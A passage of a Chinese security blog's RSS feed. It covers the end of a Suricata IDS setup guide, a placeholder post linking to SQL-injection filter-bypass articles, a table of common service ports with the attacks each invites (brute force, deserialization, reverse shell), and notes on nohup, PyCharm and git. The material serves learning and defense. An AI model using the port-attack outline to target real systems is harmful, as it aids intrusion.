ptresearch/attackdetection</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700718529.png" alt="1603700718529"></p><h2 id="3-6-规则的CRUD"><a href="#3-6-规则的CRUD" class="headerlink" title="3.6 规则的CRUD"></a>3.6 规则的CRUD</h2><p> <a href="https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching">https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching</a> </p><h1 id="4-一个实例"><a href="#4-一个实例" class="headerlink" title="4 一个实例"></a>4 一个实例</h1><p>/var/lib/suricata/rules/下创建一个test.rules,内容为：</p><pre class="line-numbers language-bash"><code class="language-bash">alert http any any -<span class="token operator">></span> any any <span class="token punctuation">(</span>msg:<span class="token string">"hit baidu.com..."</span><span class="token punctuation">;</span>content:<span class="token string">"baidu"</span><span class="token punctuation">;</span> reference:url, www.baidu.com<span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改配置文件/etc/suricata/suricata.yaml，再规则下添test.rules</p><pre><code>#启动suricata#sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml    -i eth0</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603858949410.png" alt="1603858949410"></p><h1 id="5-suricata-分析包功能"><a href="#5-suricata-分析包功能" class="headerlink" title="5 suricata 分析包功能"></a>5 suricata 分析包功能</h1><p> 分析单个包：suricata -r pcap文件名 -l 自定义输出位置</p><p> 分析文件夹里所以的包：suricata -r pcap文件夹名 -l 自定义输出位置 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/test.cap -l  /var/log/suricata/cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603955429308.png" alt="1603955429308"></p><p><img src="/2020/09/11/install-guide-suricata/1603955464136.png" alt="1603955464136"></p><h1 id="6-卸载suricata"><a href="#6-卸载suricata" class="headerlink" title="6 卸载suricata"></a>6 卸载suricata</h1><pre><code>[root@ids0001 ~]# find / -name suricata /run/suricata/etc/suricata/root/suricata-5.0.0/python/suricata/root/suricata-5.0.0/suricata-update/suricata/var/lib/suricata/var/log/suricata/usr/bin/suricata/usr/lib/python2.7/site-packages/suricata/usr/share/doc/suricata/usr/share/suricata/usr/share/kibana/x-pack/plugins/siem/public/components/timeline/body/renderers/suricata/usr/local/bin/suricata/usr/local/etc/suricata/usr/local/lib/python2.7/site-packages/suricata/usr/local/share/suricata/usr/local/share/doc/suricata/usr/local/var/log/suricata/usr/local/var/run/suricata/usr/local/var/lib/suricata/home/supper-user/suricata-5.0.0/src/suricata/home/supper-user/suricata-5.0.0/src/.libs/suricata/home/supper-user/suricata-5.0.0/python/suricata/home/supper-user/suricata-5.0.0/python/lib/suricata/home/supper-user/suricata-5.0.0/suricata-update/suricata/home/supper-user/suricata-5.0.0/suricata-update/lib/suricata</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603877103161.png" alt="1603877103161"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> -rf /run/suricata \/etc/suricata \/root/suricata-5.0.0/python/suricata \/root/suricata-5.0.0/suricata-update/suricata \/var/lib/suricata \/var/log/suricata \/usr/bin/suricata \/usr/lib/python2.7/site-packages/suricata \/usr/share/doc/suricata \/usr/share/suricata \/usr/share/kibana/x-pack/plugins/siem/public/components/timeline/body/renderers/suricata \/usr/local/bin/suricata \/usr/local/etc/suricata \/usr/local/lib/python2.7/site-packages/suricata \/usr/local/share/suricata \/usr/local/share/doc/suricata \/usr/local/var/log/suricata \/usr/local/var/run/suricata \/usr/local/var/lib/suricata \/home/supper-user/suricata-5.0.0/src/suricata \/home/supper-user/suricata-5.0.0/src/.libs/suricata \/home/supper-user/suricata-5.0.0/python/suricata \/home/supper-user/suricata-5.0.0/python/lib/suricata \/home/supper-user/suricata-5.0.0/suricata-update/suricata \/home/supper-user/suricata-5.0.0/suricata-update/lib/suricata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="7-error"><a href="#7-error" class="headerlink" title="7 error"></a>7 error</h1><p>错误1 eth0网卡不存在</p><p><img src="/2020/09/11/install-guide-suricata/1603876350581.png" alt="1603876350581"></p><pre class="line-numbers language-bash"><code class="language-bash">9:25 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INVALID_ARGUMENT<span class="token punctuation">(</span>13<span class="token punctuation">)</span><span class="token punctuation">]</span> - eve-log dns version not found, forcing it to version 228/10/2020 -- 09:09:25 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INVALID_ARGUMENT<span class="token punctuation">(</span>13<span class="token punctuation">)</span><span class="token punctuation">]</span> - eve-log dns version not found, forcing it to version 228/10/2020 -- 09:09:33 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_SYSCALL<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">]</span> - Failure when trying to <span class="token keyword">set</span> feature via ioctl <span class="token keyword">for</span> <span class="token string">'eth0'</span><span class="token keyword">:</span> Operation not supported <span class="token punctuation">(</span>95<span class="token punctuation">)</span>28/10/2020 -- 09:09:33 - <span class="token operator">&lt;</span>Notice<span class="token operator">></span> - all 2 packet processing threads, 4 management threads initialized, engine started.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>错误2  内存不够</p><p><img src="/2020/09/11/install-guide-suricata/1604628379983.png" alt="1604628379983"></p><pre class="line-numbers language-bash"><code class="language-bash">root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata -T6/11/2020 -- 02:05:11 - &lt;Info> - Running suricata under test mode6/11/2020 -- 02:05:11 - &lt;Notice> - This is Suricata version 6.0.0 RELEASE running in SYSTEM mode6/11/2020 -- 02:05:21 - &lt;Error> - [ERRCODE: SC_ERR_MEM_ALLOC(1)] - SCRealloc failed: Cannot allocate memory, while trying to allocate 67108864 bytes6/11/2020 -- 02:05:22 - &lt;Error> - [ERRCODE: SC_ERR_FATAL(171)] - Out of memory. The engine cannot be initialized.Exiting...</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启解决</p><p>问题三：内存不够 </p><p><img src="/2020/09/11/install-guide-suricata/1604629087216.png" alt="1604629087216"></p><pre class="line-numbers language-bash"><code class="language-bash">6/11/2020 -- 02:16:45 - <span class="token operator">&lt;</span>Notice<span class="token operator">></span> - This is Suricata version 6.0.0 RELEASE running <span class="token keyword">in</span> SYSTEM mode6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_SYSCALL<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">]</span> - Failure when trying to <span class="token keyword">set</span> feature via ioctl <span class="token keyword">for</span> <span class="token string">'eth0'</span><span class="token keyword">:</span> Operation not supported <span class="token punctuation">(</span>95<span class="token punctuation">)</span>6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Warning<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_INITIALIZATION<span class="token punctuation">(</span>45<span class="token punctuation">)</span><span class="token punctuation">]</span> - Unix socket: UNIX socket bind<span class="token punctuation">(</span>/usr/local/var/run/suricata/suricata-command.socket<span class="token punctuation">)</span> error: No space left on device6/11/2020 -- 02:16:54 - <span class="token operator">&lt;</span>Error<span class="token operator">></span> - <span class="token punctuation">[</span>ERRCODE: SC_ERR_FATAL<span class="token punctuation">(</span>171<span class="token punctuation">)</span><span class="token punctuation">]</span> - Unable to create unix <span class="token function">command</span> socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>8所有命令</p><pre><code>1.安装必要库(1)检查是否安装了jansson,这是Suricata输出的日志文件eve.json必备库可参考:彻底解决Suricata Eve-log support not compiled in 问题(2)安装pfring2.安装Suricatahttps://suricata-ids.org/download/下载安装包(1)解压安装包tar -zxf suricata-4.1.0.tar.gz(2)编译和安装./configure -enable-pfring --with-libpfring-includes=/opt/pfring/include --with-libpfring-libraries=/opt/pfring/lib -with-libjansson libraries=/usr/lib64/ --with-libjansson-includes=/usr/includemakemake install(3)创建必要的目录，这些目录都是suricata.yaml配置文件中写好的路径，但不会主动创建，需要手动创建mkdir /usr/local/etc/suricata/ #配置文件目录cp suricata-4.1.0/classification.config /usr/local/etc/suricata/cp suricata-4.1.0/reference.config /usr/local/etc/suricata/cp suricata-4.1.0/suricata.yaml /usr/local/etc/suricata/cp suricata-4.1.0/threshold.config /usr/local/etc/suricata/mkdir /usr/local/var/run/suricatamkdir /usr/local/var/log/suricata/ #suricata默认日志输出位置(4)离线安装规则在https://rules.emergingthreats.net/open/,中下载emerging.rules.tar.gztar -zxf emerging.rules.tar.gzrm -rf /usr/local/share/suricata/rulesmv rules /usr/local/share/suricata/(5)运行suricata/usr/local/bin/suricata --pfring-int=em1 --pfring-cluster-id=99 --pfring-cluster-type=cluster_flow -c /usr/local/etc/suricata/suricata.yaml -D(6)输出的日志的类型可以在suricata.yaml中进行设置</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/d81db4c352af">Suricata默认规则集的目的与用途</a>   nice</p><p><a href="https://suricata-update.readthedocs.io/en/latest/">suricata-update的官方文档：</a>   规则工具的官网文档 <a href="https://www.osgeo.cn/suricata/rule-management/suricata-update.html">https://www.osgeo.cn/suricata/rule-management/suricata-update.html</a> </p><p><a href="https://zhuanlan.zhihu.com/p/36340468">Suricata规则介绍、以及使用suricata-update做规则管理</a> </p><p><a href="https://zhuanlan.zhihu.com/p/37173608">Suricata IDS 入门 — 规则详解</a>  比较详细</p><p><a href="https://suricata.readthedocs.io/en/suricata-6.0.0/">suricata官方6.0 文档</a> </p><p><a href="https://suricata-update.readthedocs.io/en/latest/update.html#rule-matching">规则的CRUD</a></p><p><a href="http://www.hyuuhit.com/2018/02/11/suricata-config/">suricata命令行参数</a></p><p><a href="https://www.osgeo.cn/suricata/command-line-options.html">suricata命令行参数2</a></p><p><a href="https://www.yuque.com/dekeshile/pkiul1/rrlufv">suricata笔记</a> 不错，较全面</p><p><a href="https://www.yuque.com/dekeshile/pkiul1/rrlufv">suricata较完整的功能列表</a> 后续继续学习</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/install-guide-suricata/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>sql关键词绕过</title>
      <link>https://m01ly.github.io/2020/09/10/pt-sqlbypass/</link>
      <guid>https://m01ly.github.io/2020/09/10/pt-sqlbypass/</guid>
      <pubDate>Thu, 10 Sep 2020 08:35:30 GMT</pubDate>
      
      <description>&lt;p&gt;待完善&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><p><a href="https://blog.lgf.im/2018/bypass-tech-for-sql-injection-keyword-filtering.html">https://blog.lgf.im/2018/bypass-tech-for-sql-injection-keyword-filtering.html</a> 较全的基于关键词绕过</p><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a>  基于extractvalue()和updatexml()的报错注入</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/10/pt-sqlbypass/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>常见端口说明和攻击汇总</title>
      <link>https://m01ly.github.io/2020/09/04/pt-portinfo/</link>
      <guid>https://m01ly.github.io/2020/09/04/pt-portinfo/</guid>
      <pubDate>Fri, 04 Sep 2020 08:48:44 GMT</pubDate>
      
      <description>&lt;h3 id=&quot;文件共享服务端口&quot;&gt;&lt;a href=&quot;#文件共享服务端口&quot; class=&quot;headerlink&quot; title=&quot;文件共享服务端口&quot;&gt;&lt;/a&gt;文件共享服务端口&lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><a id="more"></a><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">21、22、69</td><td align="left">Ftp/Tftp文件传输协议</td><td align="left">允许匿名的上传、下载、爆破和嗅探</td></tr><tr><td align="left">2049</td><td align="left">Nfs服务</td><td align="left">配置不当</td></tr><tr><td align="left">139</td><td align="left">Samba服务</td><td align="left">爆破、未授权访问、远程代码执行</td></tr><tr><td align="left">389</td><td align="left">Ldap目录访问协议</td><td align="left">注入、允许匿名访问、弱口令</td></tr></tbody></table><h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">22</td><td align="left">SSH远程连接</td><td align="left">爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td align="left">23</td><td align="left">Telnet远程连接</td><td align="left">爆破、嗅探、弱口令</td></tr><tr><td align="left">3389</td><td align="left">Rdp远程桌面链接</td><td align="left">Shitf后门（<code>Window Server 2003</code>以下系统）、爆破</td></tr><tr><td align="left">5900</td><td align="left">VNC</td><td align="left">弱口令爆破</td></tr><tr><td align="left">5623</td><td align="left">PyAnywhere服务</td><td align="left">抓密码、代码执行</td></tr></tbody></table><h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a>Web应用服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">80/443/8080</td><td align="left">常见的Web服务端口</td><td align="left">Web攻击、爆破、对应服务器版本漏洞，心脏滴血等漏洞</td></tr><tr><td align="left">7001/7002</td><td align="left">WebLogic控制台</td><td align="left">Java反序列化、弱口令</td></tr><tr><td align="left">8080/8089</td><td align="left">Jboss/Resin/Jetty/Jenkins</td><td align="left">反序列化、控制器弱口令</td></tr><tr><td align="left">9090</td><td align="left">WebSphere控制台</td><td align="left">Java反序列化、弱口令</td></tr><tr><td align="left">4848</td><td align="left">GlassFish控制台</td><td align="left">弱口令</td></tr><tr><td align="left">1352</td><td align="left">Lotus domino邮件服务</td><td align="left">弱口令、信息泄露、爆破</td></tr><tr><td align="left">10000</td><td align="left">Webmin-Web控制面板</td><td align="left">弱口令</td></tr></tbody></table><h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">3306</td><td align="left">Mysqk</td><td align="left">注入、提权、爆破</td></tr><tr><td align="left">1433</td><td align="left">Mysql数据库</td><td align="left">注入、提权、SA弱口令、爆破</td></tr><tr><td align="left">1521</td><td align="left">Oracle数据库</td><td align="left">TNS爆破、注入、反弹Shell</td></tr><tr><td align="left">5432</td><td align="left">PostgreSQL数据库</td><td align="left">爆破、注入、弱口令</td></tr><tr><td align="left">27017/27018</td><td align="left">MongoDB</td><td align="left">爆破、未授权访问</td></tr><tr><td align="left">6379</td><td align="left">Redis数据库</td><td align="left">尝试未授权访问、弱口令爆破</td></tr><tr><td align="left">5000</td><td align="left">SysBase/DB2数据库</td><td align="left">爆破、注入</td></tr></tbody></table><h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">25</td><td align="left">SMTP邮件服务</td><td align="left">邮件伪造</td></tr><tr><td align="left">110</td><td align="left">POP3协议</td><td align="left">爆破、嗅探</td></tr><tr><td align="left">143</td><td align="left">IMAP协议</td><td align="left">爆破</td></tr></tbody></table><h3 id="网络参加协议端口"><a href="#网络参加协议端口" class="headerlink" title="网络参加协议端口"></a>网络参加协议端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">53</td><td align="left">DNS域名服务器</td><td align="left">允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td align="left">67/68</td><td align="left">DHCP服务</td><td align="left">劫持、欺骗</td></tr><tr><td align="left">161</td><td align="left">SNMP协议</td><td align="left">爆破、搜索目标内网信息</td></tr></tbody></table><h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">攻击方向</th></tr></thead><tbody><tr><td align="left">2181</td><td align="left">Zookeeper服务</td><td align="left">未授权访问</td></tr><tr><td align="left">8069</td><td align="left">Zavvux服务</td><td align="left">远程代码执行、SQL注入</td></tr><tr><td align="left">9200</td><td align="left">9300</td><td align="left">Elasticsearch服务</td></tr><tr><td align="left">11211</td><td align="left">Memcache服务</td><td align="left">未授权访问</td></tr><tr><td align="left">512/513/514</td><td align="left">Linux Rexec服务</td><td align="left">匿名访问、文件上传</td></tr><tr><td align="left">3690</td><td align="left">Svn服务</td><td align="left">Svn泄露、未授权访问</td></tr><tr><td align="left">50000</td><td align="left">SAP Management Console</td><td align="left">远程代码执行</td></tr></tbody></table>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/04/pt-portinfo/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>m01ly-wiki</title>
      <link>https://m01ly.github.io/2020/09/03/m01ly-wiki/</link>
      <guid>https://m01ly.github.io/2020/09/03/m01ly-wiki/</guid>
      <pubDate>Thu, 03 Sep 2020 09:54:02 GMT</pubDate>
      
      <description>&lt;p&gt;本文档仅仅是自己安装软件指南或者安装过程中踩的坑。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文档仅仅是自己安装软件指南或者安装过程中踩的坑。</p><a id="more"></a><h1 id="nohup-out文件过大"><a href="#nohup-out文件过大" class="headerlink" title="nohup.out文件过大"></a>nohup.out文件过大</h1><p>tips:最近发现有不少人在百度这个问题，当初如易我也是初学者，随便从网上搜了一下，就转过来了，不过为了避免搜索结果同质化，为大家提供更翔实的参考，我将nohup.out相关</p><p>知识整理汇总如下：</p><h4 id="1-nohup-out的由来及作用"><a href="#1-nohup-out的由来及作用" class="headerlink" title="1.nohup.out的由来及作用"></a><strong>1.nohup.out的由来及作用</strong></h4><p>用途：LINUX命令用法，不挂断地运行命令。</p><p>语法：nohup Command [ Arg … ] [　&amp; ]</p><p>描述：nohup 命令运行由 Command 参数和任何相关的 Arg 参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用 nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 &amp; （ 表示“and”的符号）到命令的尾部。</p><p>例子： nohup ./startWeblogic.sh &amp; 意思是即使退出ssh界面，命令仍然在后台执行，并且打印过程日志到nohup.out,当然也可以将nohup.out的输出转向到其他文件，高级应用请参考扩展阅读。</p><h4 id="2-nohup-out的查看方式与方法"><a href="#2-nohup-out的查看方式与方法" class="headerlink" title="2.nohup.out的查看方式与方法"></a><strong>2.nohup.out的查看方式与方法</strong></h4><p>实际使用过程中，往往人们为了省心(嗯，没错，就是懒），经常没有给nohup.out进行重定向输出，也没有按日期分割文件，会造成这个文件特别巨大，达到2G或者3G，这个使用想查看文件，搜索出错内容就比较痛苦了。一般有两种方式</p><pre><code>1.linux本机查看：使用tail 命令，查看最新的日志，或滚动监控日志打印。例如命令 tail -1000 nohup.out (查看最后1000行日志文本）　tail -ｆ nohup.out（监控日志打印）2.ftp下载到windown主机查看：一般小的log文件都没有问题，但是过G的，一般的文本文档查看就显得无力了。推荐使用UltraEdit进行打开。1234</code></pre><h4 id="3-nohup-out维护管理方法（清空nohup-out"><a href="#3-nohup-out维护管理方法（清空nohup-out" class="headerlink" title="3.nohup.out维护管理方法（清空nohup.out)"></a><strong>3.nohup.out维护管理方法（清空nohup.out)</strong></h4><p>如上文所述出现了超大号的文件简直是令人讨厌的事情，而且nohup.out会一直一直自己增长下去，如果你的服务器硬盘不给力的话，很容易把应用也挂掉（硬盘没空间 ，啥都玩不转），但是又不能一味的直接删。因为直接删除，可能会造成应用无法打印后续的错误日志，该问题常见于weblogic服务器，jboss服务器等这些大型中间件，这个在生产环境上要尤为注意。</p><p>因此就有了我们不停止服务直接，清空nohup.out文件的方法。<br>两个可以不用停止WEB服务就可以清空nohup.out的命令。</p><pre><code>第一种：cp /dev/null nohup.out第二种：cat /dev/null &gt; nohup.out12</code></pre><p>两个我都用过，不用担心网上所说的性能问题，通常2/3 个G的文件都是1-2秒执行完毕</p><h4 id="4-扩展阅读"><a href="#4-扩展阅读" class="headerlink" title="4.扩展阅读"></a><strong>4.扩展阅读</strong></h4><p>1.nohup的重定向，一劳永逸解决nohup.out文件过大的问题</p><p>以下是定义日志打印级别，除了高于级别2的告警信息记录到log文件外，其余直接不记录</p><pre><code>//只输出错误信息到日志文件nohup ./program &gt;/dev/null 2&gt;log &amp;//什么信息也不要nohup ./program &gt;/dev/null 2&gt;&amp;1 &amp;1234</code></pre><p>2.Linux的3种重定向</p><pre><code>0:表示标准输入1:标准输出,在一般使用时，默认的是标准输出2:标准错误信息输出123</code></pre><p>可以用来指定需要重定向的标准输入或输出。例如，将某个程序的错误信息输出到log文件中：./program 2&gt;log。这样标准输出还是在屏幕上，但是错误信息会输出到log文件中。另外，也可以实现0，1，2之间的重定向。2&gt;&amp;1：将错误信息重定向到标准输出。</p><p>3.关于/dev/null文件<br>Linux下还有一个特殊的文件/dev/null，它就像一个无底洞，所有重定向到它的信息都会消失得无影无踪。这一点非常有用，当我们不需要回显程序的所有信息时，就可以将输出重定向到/dev/null。</p><p><a href="https://blog.csdn.net/rickiyeat/article/details/71158936">https://blog.csdn.net/rickiyeat/article/details/71158936</a></p><h1 id="Pycharm操作"><a href="#Pycharm操作" class="headerlink" title="Pycharm操作"></a>Pycharm操作</h1><h2 id="复制粘贴不能用"><a href="#复制粘贴不能用" class="headerlink" title="复制粘贴不能用"></a>复制粘贴不能用</h2><p><strong>问题：</strong>复制粘贴没有用，一直是如图所示，写入删除也无效</p><p><img src="/2020/09/03/m01ly-wiki/1620286342026.png" alt="1620286342026"></p><p>，按键盘的insert键，就可以写入，但是老是恢复回去。</p><p><strong>解决方案：</strong>取消选择Tools–&gt;Vim Emulator</p><p><img src="/2020/09/03/m01ly-wiki/1620286413720.png" alt="1620286413720"></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>直接输入 main 然后按 回车键 或 tab键，就可以了。</p><h4 id="２-１编辑类"><a href="#２-１编辑类" class="headerlink" title="２.１编辑类"></a>２.１编辑类</h4><blockquote><p><strong>Ctrl + 鼠标 跳转到（变量、方法、类）声明</strong></p><p><strong>Ctrl + / 行注释</strong></p><p><strong>Ctrl + Shift + / 块注释</strong></p><p><strong>Ctrl + Shift + ]/[ 选定代码块结束、开始</strong></p><p><strong>Alt + ／ 自动完成（联想）</strong></p><p><strong>Ctrl + Alt + L 代码格式化</strong></p><p><strong>Ctrl + Alt + O 优化导入</strong></p><p><strong>Ctrl + Alt + I 自动缩进</strong></p><p>Tab / Shift + Tab 缩进、不缩进当前行</p><p>Ctrl + D 复制选定的区域或行</p><p>Ctrl + Y 删除选定的行</p></blockquote><h4 id="２-２运行类"><a href="#２-２运行类" class="headerlink" title="２.２运行类"></a>２.２运行类</h4><blockquote><p><strong>Shift + F10 运行</strong></p><p><strong>Shift + F9 调试</strong></p></blockquote><h4 id="２-３调试类"><a href="#２-３调试类" class="headerlink" title="２.３调试类"></a>２.３调试类</h4><blockquote><p><strong>F8 跳过</strong></p><p><strong>F7 进入</strong></p><p>Shift + F8 退出</p><p>Alt + F9 运行游标</p><p>Alt + F8 验证表达式</p><p>Ctrl + Alt + F8 快速验证表达式</p><p>F9 恢复程序</p><p>Ctrl + F8 断点开关</p><p>Ctrl + Shift + F8 查看断点</p></blockquote><h4 id="２-４导航类"><a href="#２-４导航类" class="headerlink" title="２.４导航类"></a>２.４导航类</h4><blockquote><p><strong>Ctrl + N 跳转到类</strong></p><p><strong>Ctrl + Shift + N 跳转到文件</strong></p><p><strong>Alt + Right/Left 跳转到下一个、前一个编辑的选项卡</strong></p><p>F12 回到先前的工具窗口</p><p>Esc 从工具窗口回到编辑窗口</p><p>Shift + Esc 隐藏运行的、最近运行的窗口</p><p>Ctrl + Shift + F4 关闭主动运行的选项卡</p><p>Ctrl + G 查看当前行号、字符号</p><p>Ctrl + E 当前文件弹出</p><p><strong>Ctrl+Alt+Left/Right 后退、前进</strong></p><p>Ctrl+Shift+Backspace 导航到最近编辑区域</p><p>Alt + F1 查找当前文件或标识</p><p><strong>Ctrl+B / Ctrl+Click 跳转到声明</strong></p><p><strong>Ctrl + Alt + B 跳转到实现</strong></p><p><strong>Ctrl + Shift + I查看快速定义</strong></p><p>Ctrl + Shift + B跳转到类型声明</p><p>Ctrl + U跳转到父方法、父类</p><p>Alt + Up/Down跳转到上一个、下一个方法</p><p>Ctrl + ]/[跳转到代码块结束、开始</p><p>Ctrl + F12弹出文件结构</p><p>Ctrl + H类型层次结构</p><p>Ctrl + Shift + H方法层次结构</p><p>Ctrl + Alt + H调用层次结构</p><p>F2 / Shift + F2下一条、前一条高亮的错误</p><p>F4 / Ctrl + Enter编辑资源、查看资源</p><p>Alt + Home显示导航条F11书签开关</p><p>Ctrl + Shift + F11书签助记开关</p><p>Ctrl + #[0-9]跳转到标识的书签</p><p>Shift + F11显示书签</p></blockquote><h4 id="２-５查找／替换类"><a href="#２-５查找／替换类" class="headerlink" title="２.５查找／替换类"></a>２.５查找／替换类</h4><blockquote><p>F3 下一个</p><p>Shift + F3 前一个</p><p>Ctrl + R 替换</p><p>Ctrl + Shift + F 全局查找</p><p>Ctrl + Shift + R 全局替换</p><p>Alt + F7/Ctrl + F7文件中查询用法</p><p>Ctrl + Shift + F7文件中用法高亮显示</p><p>Ctrl + Alt + F7显示用法</p></blockquote><h4 id="２-６重构类"><a href="#２-６重构类" class="headerlink" title="２.６重构类"></a>２.６重构类</h4><blockquote><p>Alt + Delete安全删除</p><p><strong>Shift + F6重命名</strong></p><p>Ctrl + F6更改签名</p><p>Ctrl + Alt + N内联</p><p><strong>Ctrl + Alt + M提取方法</strong></p><p><strong>Ctrl + Alt + V提取属性</strong></p><p><strong>Ctrl + Alt + F提取字段</strong></p><p><strong>Ctrl + Alt + C提取常量</strong></p><p><strong>Ctrl + Alt + P提取参数</strong></p></blockquote><h1 id="Git操作"><a href="#Git操作" class="headerlink" title="Git操作"></a>Git操作</h1><h2 id="linux上传git文件"><a href="#linux上传git文件" class="headerlink" title="linux上传git文件"></a>linux上传git文件</h2><p>（1）下载git项目gitalk，并配置git</p><pre><code>git clone https://github.com/m01ly/gitalkcd gitalk[root@xxx gitalk]# git config --global user.name &quot;m01ly&quot;[root@xxx gitalk]# git config --global user.email 2418093296@qq.com</code></pre><p>(2) 添加所有需要上传的文件和配置到git</p><p><code>git add FILE</code>添加确定的文件FILE<br><code>git add .</code>添加当前目录下所有文件</p><pre><code>cd gitalk[root@xxxx gitalk]# git add .</code></pre><p>（3） 提交文件</p><p>上述命令<strong>必须添加</strong>‘-m’及‘log message’，其中log message可以自己随便填写，否则是提交不成功的，在后面的<strong>push操作</strong>中会提示错误：“error:src refspec master does not match any”</p><pre><code>git commit -m &#39;log message&#39;</code></pre><p><img src="/2020/09/03/m01ly-wiki/1615346141835.png" alt="1615346141835"></p><p>至此，我们就已经<strong>提交文件到本地仓库</strong>了！</p><p>现在我们需要将上述本地仓库里的文件<strong>添加到远程库</strong>！</p><p>（4）在github里添加origin</p><pre><code>git remote add origin https://github.com/m01ly/gitalk.git</code></pre><p><strong>注意：</strong>如果之前配置过一次，再次配置则会提示以下错误：<br><strong>ERROR</strong>：远程 origin 已经存在。<br>此时只需要将远程配置删除，重新添加即可；</p><pre><code>git remote rm origingit remote add origin https://github.com/m01ly/gitalk.git</code></pre><p>再次提交文件即可正常使用</p><p>（5）上传文件</p><pre><code>git push -u origin master</code></pre><p>执行此命令后，git会提示输入github账户的用户名和密码，验证通过后，进行文件上传！</p><p><strong>注意：</strong></p><p><strong>ERROR：</strong>error: src refspec master does not match any.<br>error: failed to push some refs 